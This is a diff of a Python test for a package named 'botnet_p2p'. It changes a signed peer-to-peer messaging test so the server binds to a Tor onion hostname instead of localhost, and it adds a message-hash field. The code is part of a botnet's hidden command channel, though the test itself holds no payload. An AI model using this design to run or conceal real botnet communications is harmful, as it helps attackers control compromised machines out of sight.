@@ -9,17 +9,19 @@ from botnet_p2p.comm_utils import NodeP2P
 
 public_key_path = os.path.join(os.getcwd(), "tests/auxiliar_files/public_key")
 private_key_path = os.path.join(os.getcwd(), "tests/auxiliar_files/private_key")
-server_dir = "localhost"
-server_port = 12345
+server_port = 50001
 
 actual_msg_type = None
 actual_msg = None
+actual_hash = None
 actual_trusted = None
 
 
 def server_thread():
     server_socket = NodeP2P(public_key_path, private_key_path)
-    server_socket.bind(server_dir, server_port)
+    with open("/var/lib/tor/hidden_communication/hostname", "r") as onion:
+        comm_onion = onion.read().strip()
+    server_socket.bind(comm_onion, server_port)
     server_socket.listen(1)
     client_socket, addr = server_socket.accept()
     client_thread = threading.Thread(target=server_comm_thread, args=(client_socket,))
@@ -32,8 +34,15 @@ def server_thread():
 def server_comm_thread(client_socket: socket.socket):
     global actual_msg_type
     global actual_msg
+    global actual_hash
     global actual_trusted
-    actual_msg_type, actual_msg, actual_trusted = client_socket.recv_signed_msg()
+
+    (
+        actual_msg_type,
+        actual_msg,
+        actual_hash,
+        actual_trusted,
+    ) = client_socket.recv_signed_msg()
 
 
 def test_recv_signed_message():
